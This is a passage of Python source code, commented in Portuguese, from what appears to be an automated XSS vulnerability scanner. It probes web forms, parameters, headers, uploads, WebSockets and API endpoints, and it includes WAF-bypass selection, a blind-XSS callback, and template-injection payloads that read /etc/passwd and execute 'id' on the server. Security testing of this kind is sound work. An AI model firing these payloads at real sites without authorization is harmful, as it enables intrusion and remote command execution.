        task_id = progress.add_task("[green]Testando XSS Refletido...", total=len(tasks))
        for method, url, param, form_data in tasks:
            progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] (Refletido)...")
            
            # Primeiro, testa com um payload simples para detectar contexto
            test_payload = "xss-context-test-12345"
            test_data = {param: test_payload}
            context_detected = False
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=True)
                else: # POST
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = test_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=True)

                # Analisa CSP
                csp_info = self._analyze_csp(response)
                
                if test_payload in response.text:
                    # Detecta contexto onde o payload foi refletido
                    contexts = self._detect_context(response.text, test_payload)
                    
                    if contexts:
                        context_detected = True
                        # Testa payloads específicos para o contexto detectado
                        for payload in self.payloads[:10]:  # Usa os primeiros 10 payloads
                            test_data_context = {param: payload}
                            try:
                                if method.lower() == 'get':
                                    context_response = self.session.get(url, params=test_data_context, timeout=7, verify=True)
                                else:
                                    post_payload_context = (form_data or {}).copy()
                                    post_payload_context[param] = payload
                                    context_response = self.session.post(url, data=post_payload_context, timeout=7, verify=True)
                                
                                if payload in context_response.text:
                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                    context_str = ', '.join(contexts)
                                    csp_warning = ""
                                    if csp_info['present']:
                                        if csp_info['report_only']:
                                            csp_warning = " (CSP em modo Report-Only)"
                                        elif csp_info['allows_inline_script']:
                                            csp_warning = " (CSP permite scripts inline)"
                                        else:
                                            csp_warning = " (CSP presente mas pode ter bypass)"
                                    
                                    rec = f"Payload '{payload}' foi refletido no contexto: {context_str}{csp_warning}. Validar execução manual."
                                    
                                    # Ajusta o risco baseado no contexto e CSP
                                    risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
                                    if csp_info['present'] and not csp_info['allows_inline_script'] and not csp_info['report_only']:
                                        risk = "Médio"  # Reduz o risco se CSP está ativo
                                    
                                    self._add_finding(risk, "XSS Refletido", detail, rec)
                                    break
                            except requests.RequestException:
                                continue
                        
                        if context_detected:
                            break  # Passou para o próximo parâmetro se encontrou um contexto
                
                # Se não detectou contexto específico, testa com payloads gerais
                if not context_detected:
                    for payload in self.payloads[:5]:  # Reduz para 5 payloads base
                        test_data = {param: payload}
                        try:
                            if method.lower() == 'get':
                                response = self.session.get(url, params=test_data, timeout=7, verify=True)
                            else:
                                post_payload = (form_data or {}).copy()
                                post_payload[param] = payload
                                response = self.session.post(url, data=post_payload, timeout=7, verify=True)

                            if payload in response.text:
                                detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                rec = f"Payload '{payload}' foi refletido sem sanitização."
                                self._add_finding("Médio", "XSS Refletido", detail, rec)
                                break
                                
                        except requests.RequestException:
                            continue
                            
            except requests.RequestException as e:
                self._update_error_rate(True)
                self.logger.debug(f"Erro na requisição: {e}")
        progress.remove_task(task_id)

    def _scan_reflected_advanced(self, tasks, progress, waf_info):
        """Executa o scan para XSS Refletido com técnicas avançadas."""
        task_id = progress.add_task("[green]Scan XSS Refletido Avançado...", total=len(tasks))
        
        for method, url, param, form_data in tasks:
            # Atualiza progresso de forma limpa
            self._update_progress_with_vulns(progress, task_id, param)
            progress.update(task_id, advance=1)
            
            # Primeiro, testa com payload de análise de contexto
            test_payload = "xss-context-test-spectra-12345"
            test_data = {param: test_payload}
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=test_data, timeout=7, verify=True)
                else:
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = test_payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=True)
                
                self.stats['total_requests'] += 1
                
                if test_payload in response.text:
                    self.stats['reflected_params'] += 1
                    
                    # Log verbose para parâmetro refletido
                    if self.verbose:
                        print_info(f"Parâmetro [cyan]{param}[/cyan] reflete entrada - analisando contexto...")
                    
                    # Análise de contexto
                    contexts = self._detect_context(response.text, test_payload)
                    
                    # Log verbose para contexto detectado
                    if self.verbose and contexts:
                        context_str = ', '.join(contexts)
                        print_info(f"Contexto detectado: [yellow]{context_str}[/yellow]")
                    
                    # Análise CSP
                    csp_info = self._analyze_csp(response)
                    
                    # Log verbose para CSP
                    if self.verbose and csp_info.get('present'):
                        if csp_info.get('report_only'):
                            print_warning("CSP detectado em modo [yellow]Report-Only[/yellow]")
                        elif csp_info.get('bypasses'):
                            print_warning(f"CSP vulnerável detectado: [red]{', '.join(csp_info['bypasses'][:2])}[/red]")
                        else:
                            print_info("CSP ativo detectado")
                    
                    # Log verbose para WAF bypass
                    if self.verbose and waf_info.get('detected'):
                        print_info(f"Testando payloads de bypass para WAF [cyan]{waf_info['name']}[/cyan]...")
                    
                    # Seleciona payloads baseados no contexto e WAF (versão simplificada)
                    all_payloads_dict = self._get_default_payloads()
                    selected_payloads = []
                    selected_payloads.extend(all_payloads_dict['basic'][:3])
                    if 'attribute' in contexts:
                        selected_payloads.extend(all_payloads_dict['attribute'][:2])
                    if waf_info.get('detected'):
                        selected_payloads.extend(all_payloads_dict['waf_bypass'][:3])
                    if self.encoding_variations:
                        selected_payloads.extend(all_payloads_dict['encoded'][:2])
                    selected_payloads.extend(all_payloads_dict['polyglot'][:2])
                    
                    # Testa payloads selecionados
                    for payload in selected_payloads[:15]:  # Limite inteligente
                        # Aplica variações de encoding se necessário
                        payload_variations = self._apply_encoding_variations(payload)
                        
                        for variant in payload_variations[:3]:  # Máximo 3 variações por payload
                            test_data_variant = {param: variant}
                            
                            try:
                                if method.lower() == 'get':
                                    variant_response = self.session.get(url, params=test_data_variant, timeout=7, verify=True)
                                else:
                                    post_payload_variant = (form_data or {}).copy()
                                    post_payload_variant[param] = variant
                                    variant_response = self.session.post(url, data=post_payload_variant, timeout=7, verify=True)
                                
                                self.stats['total_requests'] += 1
                                
                                if variant in variant_response.text:
                                    # Verifica se é um bypass de WAF
                                    is_waf_bypass = waf_info['detected'] and variant != payload
                                    if is_waf_bypass:
                                        self.stats['bypasses_found'] += 1
                                        # Log verbose para bypass de WAF
                                        if self.verbose:
                                            print_success(f"Bypass de WAF encontrado com payload: [green]{variant[:50]}[/green]")
                                    
                                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                                    context_str = ', '.join(contexts) if contexts else 'Desconhecido'
                                    
                                    # Monta recomendação baseada no contexto e CSP
                                    rec_parts = [f"Payload '{variant}' refletido no contexto: {context_str}"]
                                    
                                    if csp_info.get('present'):
                                        if csp_info.get('report_only'):
                                            rec_parts.append("CSP em modo Report-Only")
                                        elif csp_info.get('bypasses'):
                                            rec_parts.append(f"CSP vulnerável: {'; '.join(csp_info['bypasses'][:2])}")
                                        else:
                                            rec_parts.append("CSP presente")
                                    
                                    if waf_info['detected']:
                                        rec_parts.append(f"WAF detectado: {waf_info['name']}")
                                    
                                    rec = ". ".join(rec_parts) + ". Validar execução manual."
                                    
                                    # Calcula risco baseado em múltiplos fatores (versão simplificada)
                                    risk_score = 0
                                    if 'script' in contexts or 'event_handler' in contexts:
                                        risk_score += 3
                                    elif 'html_text' in contexts:
                                        risk_score += 2
                                    elif 'attribute' in contexts:
                                        risk_score += 1
                                    
                                    if not csp_info.get('present'):
                                        risk_score += 2
                                    elif csp_info.get('report_only'):
                                        risk_score += 1
                                    
                                    if variant != payload and waf_info.get('detected'):
                                        risk_score += 2
                                    
                                    if risk_score >= 5:
                                        risk = "Alto"
                                    elif risk_score >= 3:
                                        risk = "Médio"
                                    else:
                                        risk = "Baixo"
                                    
                                    self._add_finding(risk, "XSS Refletido", detail, rec)
                                    # Atualiza descrição do progresso com novo achado
                                    # Silenciosa - não atualiza progresso individual aqui
                                    break  # Para com o primeiro sucesso
                                    
                            except requests.RequestException:
                                continue
                        
                        # Rate limiting inteligente
                        if waf_info['detected']:
                            time.sleep(0.5)  # Mais lento se WAF detectado
                
            except requests.RequestException:
                continue
        
        progress.remove_task(task_id)

    def _scan_dom_xss(self, tasks, progress):
        """Executa scan específico para DOM XSS."""
        task_id = progress.add_task("[blue]Scan DOM XSS...", total=len(tasks))
        
        for method, url, param, form_data in tasks:
            if method.lower() != 'get':  # DOM XSS é principalmente GET
                progress.update(task_id, advance=1)
                continue
                
            # Atualiza progresso de forma limpa
            self._update_progress_with_vulns(progress, task_id, param)
            progress.update(task_id, advance=1)
            
            # Payloads específicos para DOM
            dom_payloads = self._get_default_payloads()['dom']
            
            for payload in dom_payloads[:10]:  # Limite para DOM
                if self._detect_dom_xss(url, param, payload, progress):
                    self.stats['dom_sinks'] += 1
                    
                    # Log verbose para DOM XSS detectado
                    if self.verbose:
                        print_success(f"DOM XSS confirmado via Selenium em [cyan]{param}[/cyan]")
                    
                    detail = f"DOM XSS no parâmetro '{param}' em {url}"
                    rec = f"Payload DOM '{payload}' executado com sucesso via Selenium. Vulnerabilidade confirmada."
                    
                    self._add_finding("Alto", "DOM XSS", detail, rec)
                    # Atualiza descrição do progresso com novo achado
                    # Silenciosa - não atualiza progresso individual aqui
                    break  # Para no primeiro sucesso
        
        progress.remove_task(task_id)

    def _inject_into_forms(self, forms, progress):
        """Submete payloads em todos os formulários encontrados."""
        total_fields = sum(len([i for i in form.find_all(['input', 'textarea']) if i.get('name')]) for form in forms)
        
        if total_fields == 0:
            return
            
        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=total_fields * len(self.payloads[:5]))
        
        for form in forms:
            action = urljoin(self.base_url, form.get('action', '')) if form.get('action') else self.base_url
            method = form.get('method', 'post').lower()
            
            if method != 'post':
                progress.update(submission_task, advance=len(self.payloads[:5]) * len([i for i in form.find_all(['input', 'textarea']) if i.get('name')]))
                continue

            # Prepara dados base do formulário
            base_data = {}
            
            # Inclui campos hidden
            for hidden_field in form.find_all('input', {'type': 'hidden'}):
                if hidden_field.get('name'):
                    base_data[hidden_field['name']] = hidden_field.get('value', '')
            
            # Valores padrão para campos normais
            for field in form.find_all(['input', 'textarea']):
                field_name = field.get('name')
                field_type = field.get('type', 'text')
                
                if field_name and field_type not in ['hidden', 'submit', 'button']:
                    if field_type == 'email':
                        base_data[field_name] = 'test@example.com'
                    elif field_type == 'number':
                        base_data[field_name] = '123'
                    elif field_type == 'url':
                        base_data[field_name] = 'http://example.com'
                    else:
                        base_data[field_name] = 'test'
            
            # Testa cada campo com payloads
            for field in form.find_all(['input', 'textarea']):
                field_name = field.get('name')
                field_type = field.get('type', 'text')
                
                if not field_name or field_type in ['hidden', 'submit', 'button']:
                    continue
                
                for payload in self.payloads[:5]:  # Limita para performance
                    # Atualiza progresso de forma limpa
                    self._update_progress_with_vulns(progress, submission_task, field_name)
                    progress.update(submission_task, advance=1)
                    
                    # Cria dados de teste
                    test_data = base_data.copy()
                    test_data[field_name] = payload
                    
                    try:
                        self.session.post(action, data=test_data, timeout=7, verify=True)
                    except requests.RequestException:
                        continue
        
        progress.remove_task(submission_task)

    def _verify_storage(self, progress):
        """Rasteia o site para verificar a persistência dos payloads."""
        crawl_task = progress.add_task("[green]Verificando páginas para Stored XSS...", total=None)
        
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit and len(visited) < 10:  # Limita a 10 páginas para performance
            current_url = to_visit.pop(0)
            if current_url in visited:
                continue
            visited.add(current_url)
            progress.update(crawl_task, advance=1, description=f"Verificando {current_url[:60]}...")

            try:
                response = self.session.get(current_url, timeout=7, verify=True)
                soup = BeautifulSoup(response.content, 'html.parser', from_encoding=response.encoding)
                page_text = soup.get_text()

                for payload in self.payloads[:5]:  # Verifica apenas os primeiros 5 payloads
                    if payload in response.text or payload in page_text:
                        # Log verbose para payload persistido encontrado
                        if self.verbose:
                            print_warning(f"Payload persistido encontrado em [cyan]{current_url}[/cyan]: [yellow]{payload[:30]}[/yellow]")
                        
                        # Se o payload for encontrado, atualiza findings existentes ou cria novos
                        found_and_upgraded = False
                        for finding in self.vulnerable_points:
                            if payload in finding["Recomendação"]:
                                self._add_finding("Alto", "XSS Armazenado", finding["Detalhe"], f"Payload '{payload}' foi submetido e persistiu na aplicação.")
                                found_and_upgraded = True
                        
                        if not found_and_upgraded:
                            detail = f"Payload persistiu e foi encontrado em {current_url}"
                            self._add_finding("Alto", "XSS Armazenado", detail, f"Payload '{payload}' foi submetido e persistiu na aplicação.")

                # Coleta links para continuar a verificação
                base_netloc = urlparse(self.base_url).netloc
                for link_tag in soup.find_all('a', href=True):
                    link = urljoin(self.base_url, link_tag['href'])
                    if urlparse(link).netloc == base_netloc and link not in visited and len(to_visit) < 5:
                        to_visit.append(link)
            except (requests.RequestException, UnicodeDecodeError):
                continue
        progress.remove_task(crawl_task)

    def _init_selenium_driver(self):
        """Inicializa o driver Selenium para verificação DOM."""
        if not SELENIUM_AVAILABLE:
            print_warning("Selenium não instalado. DOM XSS verification desabilitado.")
            self.dom_verification = False
            return False
            
        if self.driver:
            return True
            
        try:
            chrome_options = Options()
            if self.headless_mode:
                chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript-harmony-shipping')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            self.driver.implicitly_wait(3)
            return True
        except Exception as e:
            self.logger.warning(f"Não foi possível inicializar Selenium: {e}")
            print_warning("Chrome/ChromeDriver não encontrado. DOM XSS verification desabilitado.")
            self.dom_verification = False
            self._selenium_initialized = False
            return False
        
        self._selenium_initialized = True
        return True

    def _cleanup_selenium(self):
        """Limpa recursos do Selenium de forma segura."""
        if self.driver:
            try:
                self.driver.quit()
            except Exception as e:
                self.logger.debug(f"Erro ao fechar driver Selenium: {e}")
            finally:
                self.driver = None
                self._selenium_initialized = False
    
    def __enter__(self):
        """Context manager entry."""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - cleanup de recursos."""
        self._cleanup_selenium()
        if hasattr(self.session, 'close'):
            try:
                self.session.close()
            except Exception as e:
                self.logger.debug(f"Erro ao fechar session: {e}")

    def _detect_dom_xss(self, url, param, payload, progress=None):
        """Detecta DOM XSS usando Selenium."""
        if not self.dom_verification:
            return False
        
        if not self._selenium_initialized and not self._init_selenium_driver():
            return False

        try:
            # Constrói URL com payload
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=new_query))
            
            if progress:
                progress.update(description=f"[blue]Verificando DOM XSS em [cyan]{param}[/cyan]...")
            
            # Carrega a página
            self.driver.get(test_url)
            
            # Aguarda execução do JavaScript
            time.sleep(2)
            
            # Verifica se houve execução de alert
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.dismiss()
                
                if 'dom-xss-spectra' in alert_text or 'xss-test-spectra' in alert_text:
                    return True
            except Exception as e:
                self.logger.debug(f"Erro inesperado: {e}")
            
            # Verifica modificações no DOM
            dom_changes = self.driver.execute_script("""
                return {
                    modified: document.documentElement.innerHTML.includes('xss-test-spectra') || 
                             document.documentElement.innerHTML.includes('dom-xss-spectra'),
                    newElements: document.querySelectorAll('script[src*="xss"], iframe[src*="javascript:"], img[onerror]').length > 0,
                    jsErrors: window.performance && window.performance.getEntriesByType('navigation')[0].loadEventEnd > 0
                };
            """)
            
            if dom_changes.get('modified') or dom_changes.get('newElements'):
                return True
                
        except Exception as e:
            self.logger.debug(f"Erro na verificação DOM: {e}")
            
        return False

    def _scan_blind_xss(self, tasks, progress):
        """Executa scan específico para Blind XSS."""
        if not self.blind_xss_callback:
            return
            
        task_id = progress.add_task("[red]Scan Blind XSS...", total=len(tasks))
        
        # Payloads de Blind XSS com callback URL
        blind_payloads = []
        for payload in self._get_default_payloads()['blind_xss']:
            blind_payloads.append(payload.replace('CALLBACK_URL', self.blind_xss_callback))
        
        for method, url, param, form_data in tasks:
            # Verifica se parâmetro já foi testado
            if self._is_parameter_already_tested(method, url, param):
                progress.update(task_id, advance=1)
                continue
                
            # Atualiza progresso de forma limpa
            self._update_progress_with_vulns(progress, task_id, param)
            progress.update(task_id, advance=1)
            
            for payload in blind_payloads[:5]:  # Limite para performance
                test_data = {param: payload}
                
                try:
                    if method.lower() == 'get':
                        response = self.session.get(url, params=test_data, timeout=7, verify=True)
                    else:
                        post_payload = (form_data or {}).copy()
                        post_payload[param] = payload
                        response = self.session.post(url, data=post_payload, timeout=7, verify=True)
                    
                    self.stats['total_requests'] += 1
                    
                    # Log verbose para Blind XSS submetido
                    if self.verbose:
                        print_info(f"Blind XSS payload submetido em [cyan]{param}[/cyan]: [yellow]{payload[:50]}[/yellow]")
                    
                    # Para Blind XSS, não há verificação imediata - depende do callback
                    detail = f"Blind XSS payload submetido no parâmetro '{param}' em {url} ({method.upper()})"
                    rec = f"Payload Blind XSS '{payload[:100]}' foi submetido. Verifique o callback URL {self.blind_xss_callback} para confirmação de execução."
                    
                    # Marca como suspeito, não confirmado
                    self._add_finding("Médio", "Blind XSS (Suspeito)", detail, rec)
                    
                except requests.RequestException:
                    continue
        
        progress.remove_task(task_id)

    def _scan_header_xss(self, base_url, progress):
        """Executa scan específico para XSS em headers HTTP."""
        if not self.test_headers:
            return
            
        # Headers comuns para testar XSS
        test_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP', 
            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'CF-Connecting-IP', 'True-Client-IP', 'X-Client-IP',
            'X-Forwarded-Host', 'X-Host', 'Origin', 'Accept-Language',
            'Accept-Encoding', 'Accept', 'Cookie', 'Authorization'
        ]
        
        task_id = progress.add_task("[yellow]Scan Header XSS...", total=len(test_headers))
        
        header_payloads = self._get_default_payloads()['header_xss']
        
        for header_name in test_headers:
            # Atualiza progresso
            progress.update(task_id, advance=1, description=f"[yellow]Testando header [cyan]{header_name}[/cyan]...")
            
            for payload in header_payloads[:3]:  # Limite para performance
                headers = {header_name: payload}
                
                try:
                    response = self.session.get(base_url, headers=headers, timeout=7, verify=True)
                    self.stats['total_requests'] += 1
                    
                    # Verifica se o payload foi refletido na resposta
                    if payload in response.text:
                        # Log verbose para header XSS detectado
                        if self.verbose:
                            print_warning(f"Header XSS detectado em [cyan]{header_name}[/cyan]: [yellow]{payload[:30]}[/yellow]")
                        
                        detail = f"XSS no header '{header_name}' refletido na resposta"
                        rec = f"Payload '{payload}' no header {header_name} foi refletido na página. Verificar execução manual."
                        
                        # Análise de contexto no header
                        contexts = self._detect_context(response.text, payload)
                        risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
                        
                        self._add_finding(risk, "XSS em Header HTTP", detail, rec)
                        break  # Para no primeiro sucesso por header
                        
                except requests.RequestException:
                    continue
        
        progress.remove_task(task_id)

    def _scan_file_upload_xss(self, forms, progress):
        """Executa scan específico para XSS via File Upload."""
        if not self.test_file_upload:
            return
            
        # Procura formulários com file upload
        upload_forms = []
        for form in forms:
            if form.find('input', {'type': 'file'}):
                upload_forms.append(form)
        
        if not upload_forms:
            return
            
        task_id = progress.add_task("[magenta]Scan File Upload XSS...", total=len(upload_forms))
        
        for form in upload_forms:
            action = urljoin(self.base_url, form.get('action', '')) if form.get('action') else self.base_url
            method = form.get('method', 'post').lower()
            
            progress.update(task_id, advance=1, description=f"[magenta]Testando upload em [cyan]{action}[/cyan]...")
            
            if method != 'post':
                continue
            
            # Prepara dados base do formulário
            base_data = {}
            for hidden_field in form.find_all('input', {'type': 'hidden'}):
                if hidden_field.get('name'):
                    base_data[hidden_field['name']] = hidden_field.get('value', '')
            
            # Testa diferentes tipos de arquivo maliciosos
            malicious_files = [
                {
                    'filename': 'xss.svg',
                    'content': '<svg onload="alert(\'svg-xss-spectra\')" xmlns="http://www.w3.org/2000/svg"><text>XSS</text></svg>',
                    'content_type': 'image/svg+xml'
                },
                {
                    'filename': 'xss.html',
                    'content': '<script>alert("html-xss-spectra")</script>',
                    'content_type': 'text/html'
                },
                {
                    'filename': 'xss.xml',
                    'content': '<?xml version="1.0"?><root><script>alert("xml-xss-spectra")</script></root>',
                    'content_type': 'application/xml'
                }
            ]
            
            file_input = form.find('input', {'type': 'file'})
            if not file_input or not file_input.get('name'):
                continue
                
            field_name = file_input['name']
            
            for file_data in malicious_files:
                try:
                    files = {field_name: (file_data['filename'], file_data['content'], file_data['content_type'])}
                    
                    response = self.session.post(action, data=base_data, files=files, timeout=10, verify=True)
                    self.stats['total_requests'] += 1
                    
                    # Verifica se o conteúdo malicioso foi refletido
                    if 'xss-spectra' in response.text:
                        # Log verbose para file upload XSS detectado
                        if self.verbose:
                            print_warning(f"File Upload XSS detectado: [cyan]{file_data['filename']}[/cyan]")
                        
                        detail = f"XSS via upload do arquivo '{file_data['filename']}' no formulário {action}"
                        rec = f"Arquivo malicioso '{file_data['filename']}' foi aceito e seu conteúdo refletido na aplicação."
                        
                        self._add_finding("Alto", "XSS via File Upload", detail, rec)
                        
                except requests.RequestException:
                    continue
        
        progress.remove_task(task_id)

    def _scan_websocket_xss(self, base_url, progress):
        """Executa scan específico para XSS em WebSockets."""
        # Converte HTTP(S) para WS(S)
        ws_url = base_url.replace('http://', 'ws://').replace('https://', 'wss://')
        
        # URLs comuns de WebSocket para testar
        ws_endpoints = [
            f"{ws_url}/ws",
            f"{ws_url}/websocket", 
            f"{ws_url}/socket.io/",
            f"{ws_url}/chat",
            f"{ws_url}/live",
            f"{ws_url}/api/ws"
        ]
        
        task_id = progress.add_task("[purple]Scan WebSocket XSS...", total=len(ws_endpoints))
        
        websocket_payloads = [
            '{"message":"<script>alert(\'ws-xss-spectra\')</script>"}',
            '{"data":"<img src=x onerror=alert(\'ws-xss-spectra\')>"}',
            '{"content":"<svg onload=alert(\'ws-xss-spectra\')>"}',
            '{"text":"\\u003cscript\\u003ealert(\\"ws-xss-spectra\\")\\u003c/script\\u003e"}',
            '{"msg":"<iframe src=javascript:alert(\'ws-xss-spectra\')></iframe>"}'
        ]
        
        for ws_endpoint in ws_endpoints:
            progress.update(task_id, advance=1, description=f"[purple]Testando WebSocket [cyan]{ws_endpoint}[/cyan]...")
            
            try:
                # Tenta conectar ao WebSocket
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                async def test_websocket():
                    try:
                        async with websockets.connect(ws_endpoint, timeout=5) as websocket:
                            for payload in websocket_payloads[:3]:
                                await websocket.send(payload)
                                
                                # Tenta receber resposta
                                try:
                                    response = await asyncio.wait_for(websocket.recv(), timeout=2)
                                    
                                    # Verifica se o payload foi refletido
                                    if 'xss-spectra' in response:
                                        detail = f"WebSocket XSS em {ws_endpoint}"
                                        rec = f"Payload '{payload}' foi refletido na resposta do WebSocket."
                                        
                                        with self.results_lock:
                                            self.stats['total_requests'] += 1
                                        
                                        if self.verbose:
                                            print_warning(f"WebSocket XSS detectado em [cyan]{ws_endpoint}[/cyan]")
                                        
                                        self._add_finding("Alto", "WebSocket XSS", detail, rec)
                                        return True
                                        
                                except asyncio.TimeoutError:
                                    continue
                                    
                    except Exception as e:
                        self.logger.debug(f"Erro no WebSocket: {e}")
                        return False
                    return False
                
                # Executa teste assíncrono
                if loop.run_until_complete(test_websocket()):
                    break
                    
            except Exception as e:
                self.logger.debug(f"Erro no WebSocket test: {e}")
                continue
            finally:
                loop.close()
        
        progress.remove_task(task_id)

    def _scan_api_json_xss(self, base_url, progress):
        """Executa scan específico para XSS em APIs/JSON endpoints."""
        # Endpoints comuns de API para testar
        api_endpoints = [
            f"{base_url}/api/",
            f"{base_url}/api/v1/",
            f"{base_url}/api/v2/",
            f"{base_url}/rest/",
            f"{base_url}/graphql",
            f"{base_url}/json",
            f"{base_url}/ajax",
            f"{base_url}/api/search",
            f"{base_url}/api/users",
            f"{base_url}/api/data"
        ]
        
        task_id = progress.add_task("[cyan]Scan API/JSON XSS...", total=len(api_endpoints))
        
        # Payloads para APIs/JSON
        json_payloads = [
            '{"query":"<script>alert(\\"api-xss-spectra\\")</script>"}',
            '{"search":"<img src=x onerror=alert(\\"api-xss-spectra\\")>"}',
            '{"data":"<svg onload=alert(\\"api-xss-spectra\\")>"}',
            '{"input":"\\u003cscript\\u003ealert(\\"api-xss-spectra\\")\\u003c/script\\u003e"}',
            '{"message":"<iframe src=javascript:alert(\\"api-xss-spectra\\")></iframe>"}'
        ]
        
        for endpoint in api_endpoints:
            progress.update(task_id, advance=1, description=f"[cyan]Testando API [cyan]{endpoint}[/cyan]...")
            
            for payload in json_payloads[:3]:  # Limita payloads
                try:
                    # Headers para APIs
                    headers = {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    
                    # Testa POST JSON
                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=7, verify=True)
                    self.stats['total_requests'] += 1
                    
                    # Verifica se o payload foi refletido na resposta
                    if 'api-xss-spectra' in response.text:
                        detail = f"API/JSON XSS em {endpoint}"
                        rec = f"Payload JSON '{payload}' foi refletido na resposta da API."
                        
                        if self.verbose:
                            print_warning(f"API/JSON XSS detectado em [cyan]{endpoint}[/cyan]")
                        
                        self._add_finding("Alto", "API/JSON XSS", detail, rec)
                        break
                    
                    # Testa também GET com parâmetros JSON
                    try:
                        import json
                        payload_dict = json.loads(payload)
                        response = self.session.get(endpoint, params=payload_dict, timeout=7, verify=True)
                        self.stats['total_requests'] += 1
                        
                        if 'api-xss-spectra' in response.text:
                            detail = f"API GET XSS em {endpoint}"
                            rec = f"Parâmetros JSON refletidos na resposta da API via GET."
                            
                            self._add_finding("Médio", "API GET XSS", detail, rec)
                            break
                            
                    except (json.JSONDecodeError, requests.RequestException):
                        continue
                        
                except requests.RequestException:
                    continue
        
        progress.remove_task(task_id)

    def _detect_template_engine(self, response_text):
        """Detecta template engines baseado em padrões na resposta."""
        template_patterns = {
            'Jinja2': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'jinja', r'flask'],
            'Twig': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'twig', r'symfony'],
            'Django': [r'\{\{.*?\}\}', r'\{%.*?%\}', r'django', r'csrf_token'],
            'Smarty': [r'\{.*?\}', r'\{assign', r'\{if', r'smarty'],
            'Mustache': [r'\{\{.*?\}\}', r'mustache', r'handlebars'],
            'Velocity': [r'\$\{.*?\}', r'#set', r'#if', r'velocity'],
            'FreeMarker': [r'\$\{.*?\}', r'<#.*?>', r'freemarker'],
            'Thymeleaf': [r'th:', r'thymeleaf', r'\$\{.*?\}'],
            'JSP': [r'<%.*?%>', r'\$\{.*?\}', r'jsp:', r'jstl'],
            'Angular': [r'\{\{.*?\}\}', r'ng-', r'angular', r'\[\(.*?\)\]'],
            'Vue': [r'\{\{.*?\}\}', r'v-', r'vue', r'@click'],
            'React': [r'react', r'jsx', r'className', r'useState']
        }
        
        detected_engines = {}
        
        for engine, patterns in template_patterns.items():
            confidence = 0
            for pattern in patterns:
                matches = len(re.findall(pattern, response_text, re.IGNORECASE))
                confidence += matches
            
            if confidence > 0:
                detected_engines[engine] = confidence
        
        # Retorna engines ordenados por confiança
        return sorted(detected_engines.items(), key=lambda x: x[1], reverse=True)

    def _scan_template_injection_xss(self, tasks, progress):
        """Executa scan específico para XSS via Template Injection."""
        task_id = progress.add_task("[orange3]Scan Template Injection XSS...", total=len(tasks))
        
        # Payloads específicos para diferentes template engines
        template_payloads = {
            'Jinja2': [
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            'Twig': [
                "{{7*7}}", 
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}"
            ],
            'Smarty': [
                "{php}echo 7*7;{/php}",
                "{literal}<script>alert('smarty-xss-spectra')</script>{/literal}"
            ],
            'Angular': [
                "{{7*7}}",
                "{{constructor.constructor('alert(\"angular-xss-spectra\")')()}}",
                "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor.prototype.toString,'alert(\"angular-xss-spectra\")')}}"
            ],
            'Generic': [
                "${7*7}",
                "#{7*7}",
                "{{7*7}}",
                "%{7*7}",
                "<script>alert('template-xss-spectra')</script>"
            ]
        }
        
        for method, url, param, form_data in tasks:
            progress.update(task_id, advance=1, description=f"[orange3]Testando Template Injection em [cyan]{param}[/cyan]...")
            
            # Primeiro, detecta o template engine
            try:
                if method.lower() == 'get':
                    detect_response = self.session.get(url, timeout=7, verify=True)
                else:
                    detect_response = self.session.post(url, data=(form_data or {}), timeout=7, verify=True)
                
                detected_engines = self._detect_template_engine(detect_response.text)
                
                # Escolhe payloads baseados na detecção
                selected_payloads = []
                if detected_engines:
                    # Usa payloads específicos do engine detectado
                    top_engine = detected_engines[0][0]
                    selected_payloads.extend(template_payloads.get(top_engine, []))
                    
                    if self.verbose:
                        print_info(f"Template engine detectado: [yellow]{top_engine}[/yellow] em [cyan]{url}[/cyan]")
                else:
                    # Usa payloads genéricos
                    selected_payloads.extend(template_payloads['Generic'])
                
